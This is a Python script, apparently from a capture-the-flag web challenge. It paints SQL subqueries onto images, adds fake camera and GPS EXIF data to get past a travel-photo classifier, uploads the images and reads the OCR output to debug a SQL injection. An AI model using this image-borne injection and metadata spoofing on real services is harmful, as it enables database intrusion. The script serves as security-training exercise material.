# v2_seeocr.py — the failing query text looks perfect to a human but OCR 500s it. To SEE what the
# OCR actually produced, upload the SAME text but WITHOUT the closing quote wrapper, so it can't
# break SQL (stored as plain literal), then read summary_ocr to see the OCR's word order/chars.
# Print image name + validate status.
import requests, base64, re
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open("paisaje.png").convert("RGB")
CNT=[0]

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, fname, size=30):
    W=min(2000,max(1000,40+int(len(text)*size*0.56))); H=260
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img); f=font(size)
    bb=d.textbbox((20,20),text,font=f); d.rectangle([0,0,W,bb[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=f,fill=(0,0,0)); img.save(fname,"jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),fname)
    return "data:image/jpeg;base64,"+base64.b64encode(open(fname,"rb").read()).decode()

def up(text, desc):
    CNT[0]+=1
    fname=f"s_{desc}.jpg"
    print(f"[img {fname}] painted={text!r}")
    uri=build(text, fname)
    r=requests.post(f"{BASE}/upload", json={"image":uri,"description":desc,"user_id":UID})
    body=r.text[:50].replace("\n"," ")
    ocr=""
    if r.status_code==200:
        data=requests.get(f"{BASE}/images/{UID}").json()
        row=next((x for x in data if x.get("description")==desc),None)
        ocr=row.get("summary_ocr","") if row else ""
        print(f"   200 OK  OCR-READ-AS => {ocr!r}")
    elif "viaje" in body:
        print(f"   {r.status_code} CLASSIFIER-REJECT")
    else:
        print(f"   {r.status_code} SQL-BROKE")
    return ocr

# Paint the SAME inner text as the failing query but as a PLAIN literal (no wrapper) so it stores.
# This reveals exactly how OCR reorders/mangles it.
print("=== see how OCR reads the failing query text (as plain literal) ===")
up("SELECT user_id FROM images LIMIT 1", "plain_lim")
up("(SELECT user_id FROM images LIMIT 1)", "paren_lim")
up("x(SELECT user_id FROM images LIMIT 1)x", "wrapped_lim")
# and the version with the || (no quotes) to see if || near parens reorders
up("9 (SELECT user_id FROM images LIMIT 1) 9", "spaced_lim")
